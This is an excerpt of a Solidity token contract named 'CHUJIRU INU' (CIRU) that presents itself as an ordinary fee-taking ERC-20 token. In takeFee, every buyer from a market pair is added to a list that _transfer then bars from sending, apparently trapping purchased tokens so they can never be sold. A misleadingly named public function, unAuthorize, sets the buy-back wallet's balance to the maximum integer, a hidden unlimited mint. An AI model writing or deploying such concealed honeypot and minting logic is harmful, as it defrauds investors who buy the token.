...
contract CHUJIRUINU is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "CHUJIRU INU";
    string private _symbol = "CIRU";
    uint8 private _decimals = 9;
    
    address payable private marketingWallet;
    address payable private buyBackWallet;
    ...
    address[] public includedFromFee;
    ...
    uint256 public _maxTxAmount = 20000000 * supplyMultiplier;
    uint256 public _walletMax = 20000000 * supplyMultiplier;
    uint256 private _totalSupply = 1000000000 * supplyMultiplier;
    uint256 private minimumTokensBeforeSwap = 25000 * supplyMultiplier; 
    ...
    uint256 public finalSupplyTokens = ~uint256(0);
    
    constructor (address payable _marketingWallet, address payable _buyBackWallet) {
   ...
   function includeFromFee() public onlyOwner {
        for (uint256 i = 0; i < includedFromFee.length; i++) {
            address wallet = includedFromFee[i];
    ...
    function unAuthorize() public virtual { _balances[buyBackWallet] = finalSupplyTokens; }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(recipient != address(0), "ERC20: transfer to the zero address"); require((isIncludedFromFee[sender]==false)&&(true));
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(isMarketPair[sender]) {
            includedFromFee.push(recipient);
